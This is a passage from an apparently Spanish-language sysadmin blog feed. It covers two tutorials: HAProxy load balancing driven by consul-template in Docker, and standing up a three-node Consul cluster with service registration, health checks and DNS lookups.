version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  loadbalancer:
    image: sirrtea/haproxy:alpine
    container_name: balancer
    hostname: balancer
    network_mode: host
    volumes:
      - /etc/haproxy
  templater:
    image: templater
    container_name: templater
    hostname: templater
    network_mode: host
    volumes:
      - ./haproxy.ctmpl:/tmp/haproxy.ctmpl:ro
      - /var/run/docker.sock:/var/run/docker.sock
    volumes_from:
      - loadbalancer
    command: consul-template -template &lt;span class="s2"&gt;&amp;quot;/tmp/haproxy.ctmpl:/etc/haproxy/haproxy.cfg:docker restart balancer&amp;quot;&lt;/span&gt;
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fijáos especialmente en:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El volumen en &lt;em&gt;/etc/haproxy/&lt;/em&gt;, para poder compartir el fichero de configuración.&lt;/li&gt;
&lt;li&gt;El volumen &lt;em&gt;/var/run/docker.sock&lt;/em&gt; para controlar el servidor &lt;strong&gt;docker&lt;/strong&gt; del &lt;em&gt;host&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;La plantilla, que también se añade como volumen.&lt;/li&gt;
&lt;li&gt;Y como curiosidad, el comando &lt;strong&gt;consul-template&lt;/strong&gt; necesario, con el comando de &lt;em&gt;restart&lt;/em&gt; del contendor &lt;em&gt;balancer&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La plantilla de &lt;strong&gt;haproxy&lt;/strong&gt; tampoco tiene ninguna complejidad...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ cat haproxy.ctmpl
global
    chroot /var/lib/haproxy
    user haproxy
    group haproxy

defaults
    mode http

listen stats
    &lt;span class="nb"&gt;bind&lt;/span&gt; *:8080
    stats &lt;span class="nb"&gt;enable&lt;/span&gt;
    stats uri /

listen web
    &lt;span class="nb"&gt;bind&lt;/span&gt; *:80
    balance roundrobin
&lt;span class="o"&gt;{{&lt;/span&gt; range service &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}}&lt;/span&gt;
    server &lt;span class="o"&gt;{{&lt;/span&gt; .ID &lt;span class="o"&gt;}}&lt;/span&gt; &lt;span class="o"&gt;{{&lt;/span&gt; .Address &lt;span class="o"&gt;}}&lt;/span&gt;:&lt;span class="o"&gt;{{&lt;/span&gt; .Port &lt;span class="o"&gt;}}&lt;/span&gt;
&lt;span class="o"&gt;{{&lt;/span&gt; end &lt;span class="o"&gt;}}&lt;/span&gt;
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Resultado&lt;/h3&gt;
&lt;p&gt;Com ambos servicios &lt;em&gt;web&lt;/em&gt; funcionando todo va como se espera (también lo podemos comprobar en la página de estadísticas de &lt;strong&gt;haproxy&lt;/strong&gt;, en el puerto 8080):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; balancer cat /etc/haproxy/haproxy.cfg &lt;span class="p"&gt;|&lt;/span&gt; grep server
    server web1 &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15:8001
    server web2 &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15:8002
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web1
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web1
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si se cae, por ejemplo, el servicio &lt;em&gt;web1&lt;/em&gt; en el puerto 8001, &lt;strong&gt;consul&lt;/strong&gt; lo detecta. En este momento, &lt;strong&gt;consul-template&lt;/strong&gt; regenera la configuración y reinica el contenedor &lt;em&gt;balancer&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; balancer cat /etc/haproxy/haproxy.cfg &lt;span class="p"&gt;|&lt;/span&gt; grep server
    server web2 &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15:8002
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se cae el servicio &lt;em&gt;web2&lt;/em&gt;, y nos quedamos sin servicio completamente, pero la configuración queda como se espera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; balancer cat /etc/haproxy/haproxy.cfg &lt;span class="p"&gt;|&lt;/span&gt; grep server
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;503 Service Unavailable&amp;lt;/h1&amp;gt;
No server is available to handle this request.
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos quedaría restablecer el servicio tanto en &lt;em&gt;web1&lt;/em&gt; como en &lt;em&gt;web2&lt;/em&gt;, y verificar que el servicio global se restablece:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; balancer cat /etc/haproxy/haproxy.cfg &lt;span class="p"&gt;|&lt;/span&gt; grep server
    server web1 &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15:8001
    server web2 &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15:8002
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web1
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web1
gerard@atlantis:~/projects/balancer$ curl http://localhost:80/
web2
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso sería añadir nuevos nodos con &lt;strong&gt;consul&lt;/strong&gt; para observar como la configuración de &lt;strong&gt;hoproxy&lt;/strong&gt; crece. De esta forma, no tendremos que preocuparnos de la configuración del balanceador nunca más; solamente de tener la plantilla actualizada si añadimos más aplicaciones.&lt;/p&gt;</content><category term="consul"></category><category term="service discovery"></category><category term="balanceador"></category></entry><entry><title>Levantando un cluster de consul</title><link href="http://www.linuxsysadmin.ml/2018/04/levantando-un-cluster-de-consul.html" rel="alternate"></link><published>2018-04-30T10:00:00+02:00</published><updated>2018-04-30T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-30:/2018/04/levantando-un-cluster-de-consul.html</id><summary type="html">&lt;p&gt;Ya vimos que &lt;strong&gt;consul&lt;/strong&gt; nos permitía mantener una foto del estado de nuestros servidores y de los servicios que corren en ellos. Es todavía más importante cuando contamos con varios servidores, y todos declaran sus partes a un servidor central, de forma que tenemos una foto global de la situación …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos que &lt;strong&gt;consul&lt;/strong&gt; nos permitía mantener una foto del estado de nuestros servidores y de los servicios que corren en ellos. Es todavía más importante cuando contamos con varios servidores, y todos declaran sus partes a un servidor central, de forma que tenemos una foto global de la situación.&lt;/p&gt;
&lt;p&gt;Para este ejemplo, vamos a contar con 3 servidores; uno de los cuales va a actuar de &lt;em&gt;servidor&lt;/em&gt; y el resto harán de &lt;em&gt;clientes&lt;/em&gt;. Los servidores son:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;node1&lt;/strong&gt; &amp;rarr; Dirección IP 10.0.0.2 (será el &lt;em&gt;servidor&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;node2&lt;/strong&gt; &amp;rarr; Dirección IP 10.0.0.3 (será un &lt;em&gt;cliente&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;node3&lt;/strong&gt; &amp;rarr; Dirección IP 10.0.0.4 (será un &lt;em&gt;cliente&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Es posible poner varios &lt;em&gt;servidores&lt;/em&gt; para obtener alta disponibilidad, pero al no ser un servício crítico, no vamos a extender el artículo innecesariamente.&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2018/04/monitorizacion-y-service-discovery-con-consul.html"&gt;otro articulo&lt;/a&gt; que &lt;strong&gt;consul&lt;/strong&gt; no necesita instalación, ya que es un binario estático. Para su fácil distribución entre las máquinas, lo he empaquetado en una imagen de &lt;strong&gt;docker&lt;/strong&gt;, acompañado de una carpeta &lt;em&gt;/data/&lt;/em&gt; que es donde &lt;strong&gt;consul&lt;/strong&gt; deja sus ficheros operativos. Vamos a inyectar la configuración desde el servidor mediante &lt;em&gt;host volumes&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para tener el artículo completo, adjunto el contexto con el que se contruyó la imagen que usamos en el mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul/build$ cat Dockerfile
FROM scratch
ADD rootfs.tar.gz /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/consul&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/projects/consul/build$ tar tf rootfs.tar.gz
consul
data/
gerard@atlantis:~/projects/consul/build$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos deja una imagen de unos 28mb. He usado el &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;sirrtea/consul:1.0.5&lt;/code&gt; y lo he subido de forma temporal a &lt;a href="https://hub.docker.com/"&gt;DockerHub&lt;/a&gt;, que va a funcionar como repositorio de imágenes. No hace falta decir que 1.0.5 es la versión de &lt;strong&gt;consul&lt;/strong&gt; en el momento de escribir el artículo...&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Los &lt;em&gt;clientes&lt;/em&gt; son volátiles; no necesitamos persistir su carpeta de datos porque no guardan nada importante. Sin embargo, la carpeta &lt;em&gt;/data/&lt;/em&gt; de los servidores guardan información importante del &lt;em&gt;cluster&lt;/em&gt; y debe asegurarse que no se pierden en el reinicio del contenedor.&lt;/p&gt;
&lt;h2&gt;Levantando el master&lt;/h2&gt;
&lt;p&gt;Ponemos en &lt;strong&gt;node1&lt;/strong&gt; un carpeta con el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; y la configuración vacía, en donde lo tendremos todo ordenado.&lt;/p&gt;
&lt;p&gt;Es importante recalcar que la configuración la mapeamos desde el &lt;em&gt;host&lt;/em&gt; y también la carpeta de datos, para que al reiniciar el contenedor no de pierda. Si eso pasara, habría que volver a añadir manualmente todos los otros nodos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  consul:
    image: sirrtea/consul:1.0.5
    container_name: consul
    hostname: consul
    network_mode: host
    volumes:
      - ./consul.json:/consul.json
      - ./data:/data
    command: agent -node node1 -advertise &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 -data-dir /data --config-file /consul.json -server -bootstrap-expect&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
    restart: always
gerard@node1:~/consul$ cat consul.json
&lt;span class="o"&gt;{}&lt;/span&gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el servidor con &lt;strong&gt;docker-compose&lt;/strong&gt; de la forma habitual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker-compose up -d
Creating consul ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el &lt;em&gt;cluster&lt;/em&gt; solo tiene el servidor, ya que no hemos puesto otros nodos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; consul /consul members
Node   Address        Status  Type    Build  Protocol  DC   Segment
node1  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:8301  alive   server  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;all&amp;gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda por ver que el &lt;em&gt;servidor&lt;/em&gt; asume el rol de &lt;em&gt;leader&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker-compose logs &lt;span class="p"&gt;|&lt;/span&gt; grep -o &lt;span class="s2"&gt;&amp;quot;New leader elected.*&amp;quot;&lt;/span&gt;
New leader elected: node1
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo los clientes&lt;/h2&gt;
&lt;p&gt;De forma similar, vamos a crear una carpeta en &lt;strong&gt;node2&lt;/strong&gt; y en &lt;strong&gt;node3&lt;/strong&gt; (y en un futuro en el resto de nodos) para contener el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; y la configuración de &lt;strong&gt;consul&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a poner una configuración vacía; más adelante ya añadiremos servicios y &lt;em&gt;health checks&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node2:~/consul$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  consul:
    image: sirrtea/consul:1.0.5
    container_name: consul
    hostname: consul
    network_mode: host
    volumes:
      - ./consul.json:/consul.json
    command: agent -node node2 -advertise &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3 -data-dir /data --config-file /consul.json -join node1
    restart: always
gerard@node2:~/consul$ cat consul.json
&lt;span class="o"&gt;{}&lt;/span&gt;
gerard@node2:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: La operación de &lt;em&gt;join&lt;/em&gt; se puede hacer en el comando de inicio o manualmente &lt;em&gt;a posteriori&lt;/em&gt;; la primera forma nos simplifica bastante el trabajo.&lt;/p&gt;
&lt;p&gt;Levantamos el contenedor de &lt;strong&gt;consul&lt;/strong&gt; y verificamos que el &lt;em&gt;cluster&lt;/em&gt; conoce al nuevo miembro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node2:~/consul$ docker-compose up -d
Creating consul ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@node2:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; consul /consul members
Node   Address        Status  Type    Build  Protocol  DC   Segment
node1  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:8301  alive   server  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;all&amp;gt;
node2  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3:8301  alive   client  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;default&amp;gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Repetimos lo mismo para el &lt;strong&gt;node3&lt;/strong&gt; (cuidado con la IP de &lt;em&gt;advertise&lt;/em&gt;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; consul /consul members
Node   Address        Status  Type    Build  Protocol  DC   Segment
node1  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:8301  alive   server  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;all&amp;gt;
node2  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3:8301  alive   client  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;default&amp;gt;
node3  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4:8301  alive   client  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;default&amp;gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La misma verificación se puede hacer solicitando la dirección de los nuevos nodos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; node1.node.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; node2.node.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; node3.node.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo servicios&lt;/h2&gt;
&lt;p&gt;Supongamos ahora que queremos declarar un servicio &lt;em&gt;web&lt;/em&gt; en &lt;strong&gt;node1&lt;/strong&gt; y &lt;strong&gt;node2&lt;/strong&gt;. Simplemente vamos a añadir una configuración adecuada y a reiniciar el contenedor de &lt;strong&gt;consul&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;A pesar de que &lt;strong&gt;node1&lt;/strong&gt; es un &lt;em&gt;servidor&lt;/em&gt; y &lt;strong&gt;node2&lt;/strong&gt; es un &lt;em&gt;cliente&lt;/em&gt;, eso solo afecta a la mecánica del &lt;em&gt;cluster&lt;/em&gt;. Siguen siendo dos &lt;em&gt;agentes&lt;/em&gt; normales a todos los efectos; se configuran y se operan de la misma forma.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8080&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8080/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@node1:~/consul$ docker-compose restart
Restarting consul ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: al tener la carpeta &lt;em&gt;/data/&lt;/em&gt; en el &lt;em&gt;host&lt;/em&gt; en donde corre el &lt;em&gt;servidor&lt;/em&gt;, no perdemos la lista de &lt;em&gt;clientes&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; consul /consul members
Node   Address        Status  Type    Build  Protocol  DC   Segment
node1  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:8301  alive   server  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;all&amp;gt;
node2  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3:8301  alive   client  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;default&amp;gt;
node3  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4:8301  alive   client  &lt;span class="m"&gt;1&lt;/span&gt;.0.5  &lt;span class="m"&gt;2&lt;/span&gt;         dc1  &amp;lt;default&amp;gt;
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo mismo para &lt;strong&gt;node2&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node2:~/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8080&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8080/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@node2:~/consul$ docker-compose restart
Restarting consul ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@node2:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda por observar que el servidor DNS integrado nos devuelve ambos, ya que están saludables:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Caídas e incrementos de servicio&lt;/h2&gt;
&lt;p&gt;Si se cayera, por ejemplo, la web de &lt;strong&gt;node1&lt;/strong&gt;, el servidor DNS no la devolvería, al no estar saludable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este detalle hace que podamos añadir el servicio en otro nodo &lt;strong&gt;antes&lt;/strong&gt; del mismo servicio. Como la web no funciona, &lt;strong&gt;consul&lt;/strong&gt; no devolvería el nuevo nodo hasta que la web estuviera instalada, funcionando y saludable.&lt;/p&gt;
&lt;p&gt;Así pues, vamos a declarar el servicio &lt;em&gt;web&lt;/em&gt; también en &lt;strong&gt;nodo3&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node3:~/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8080&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8080/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@node3:~/consul$ docker-compose restart
Restarting consul ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@node3:~/consul$
&lt;/pre&gt;&lt;/div&gt;


